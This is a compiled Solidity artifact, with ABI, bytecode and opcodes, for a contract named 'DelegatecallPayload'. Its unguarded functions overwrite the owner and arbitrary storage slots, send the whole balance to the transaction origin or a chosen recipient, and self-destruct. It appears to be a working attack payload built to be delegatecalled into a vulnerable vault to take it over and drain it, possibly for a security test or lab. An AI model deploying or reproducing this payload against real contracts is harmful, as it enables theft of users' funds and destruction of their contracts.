{"contracts/DelegatecallPayload.sol":{"DelegatecallPayload":{"abi":[{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"changeOwner","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address payable","name":"recipient","type":"address"}],"name":"destroyVault","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address payable","name":"recipient","type":"address"}],"name":"drain","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"emergencyDrain","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"slot","type":"uint256"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"overwriteStorage","outputs":[],"stateMutability":"nonpayable","type":"function"}],"evm":{"bytecode":{"linkReferences":{},"object":"608060405234801561001057600080fd5b5061028a806100206000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c806307b7e9ff1461005c5780632caac08b14610070578063a6f9dae114610078578063ece531321461008b578063fab2343f1461009e575b600080fd5b61006e61006a3660046101f9565b9055565b005b61006e6100b1565b61006e610086366004610230565b600055565b61006e610099366004610230565b61014c565b61006e6100ac366004610230565b6101ed565b47801561014957604051600090329083908381818185875af1925050503d80600081146100fa576040519150601f19603f3d011682016040523d82523d6000602084013e6100ff565b606091505b50509050806101475760405162461bcd60e51b815260206004820152600f60248201526e151c985b9cd9995c8819985a5b1959608a1b60448201526064015b60405180910390fd5b505b50565b478015610147576000826001600160a01b03168260405160006040518083038185875af1925050503d80600081146101a0576040519150601f19603f3d011682016040523d82523d6000602084013e6101a5565b606091505b50509050806101e85760405162461bcd60e51b815260206004820152600f60248201526e151c985b9cd9995c8819985a5b1959608a1b604482015260640161013e565b505050565b806001600160a01b0316ff5b6000806040838503121561020c57600080fd5b50508035926020909101359150565b6001600160a01b038116811461014957600080fd5b60006020828403121561024257600080fd5b813561024d8161021b565b939250505056fea2646970667358221220da42c8f57b36c45cd6b133ad79bb838bb92956a4c0b4911e3e31a6681ea0d7d164736f6c63430008120033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x28A DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x57 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x7B7E9FF EQ PUSH2 0x5C JUMPI DUP1 PUSH4 0x2CAAC08B EQ PUSH2 0x70 JUMPI DUP1 PUSH4 0xA6F9DAE1 EQ PUSH2 0x78 JUMPI DUP1 PUSH4 0xECE53132 EQ PUSH2 0x8B JUMPI DUP1 PUSH4 0xFAB2343F EQ PUSH2 0x9E JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x6E PUSH2 0x6A CALLDATASIZE PUSH1 0x4 PUSH2 0x1F9 JUMP JUMPDEST SWAP1 SSTORE JUMP JUMPDEST STOP JUMPDEST PUSH2 0x6E PUSH2 0xB1 JUMP JUMPDEST PUSH2 0x6E PUSH2 0x86 CALLDATASIZE PUSH1 0x4 PUSH2 0x230 JUMP JUMPDEST PUSH1 0x0 SSTORE JUMP JUMPDEST PUSH2 0x6E PUSH2 0x99 CALLDATASIZE PUSH1 0x4 PUSH2 0x230 JUMP JUMPDEST PUSH2 0x14C JUMP JUMPDEST PUSH2 0x6E PUSH2 0xAC CALLDATASIZE PUSH1 0x4 PUSH2 0x230 JUMP JUMPDEST PUSH2 0x1ED JUMP JUMPDEST SELFBALANCE DUP1 ISZERO PUSH2 0x149 JUMPI PUSH1 0x40 MLOAD PUSH1 0x0 SWAP1 ORIGIN SWAP1 DUP4 SWAP1 DUP4 DUP2 DUP2 DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0xFA JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0xFF JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x147 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x151C985B9CD9995C8819985A5B1959 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMPDEST POP JUMP JUMPDEST SELFBALANCE DUP1 ISZERO PUSH2 0x147 JUMPI PUSH1 0x0 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP3 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1A0 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1A5 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x1E8 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x151C985B9CD9995C8819985A5B1959 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x13E JUMP JUMPDEST POP POP POP JUMP JUMPDEST DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SELFDESTRUCT JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x20C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP DUP1 CALLDATALOAD SWAP3 PUSH1 0x20 SWAP1 SWAP2 ADD CALLDATALOAD SWAP2 POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x149 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x242 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD PUSH2 0x24D DUP2 PUSH2 0x21B JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xDA TIMESTAMP 0xC8 CREATE2 PUSH28 0x36C45CD6B133AD79BB838BB92956A4C0B4911E3E31A6681EA0D7D164 PUSH20 0x6F6C634300081200330000000000000000000000 "},"methodIdentifiers":{"changeOwner(address)":"a6f9dae1","destroyVault(address)":"fab2343f","drain(address)":"ece53132","emergencyDrain()":"2caac08b","overwriteStorage(uint256,uint256)":"07b7e9ff"}}}}}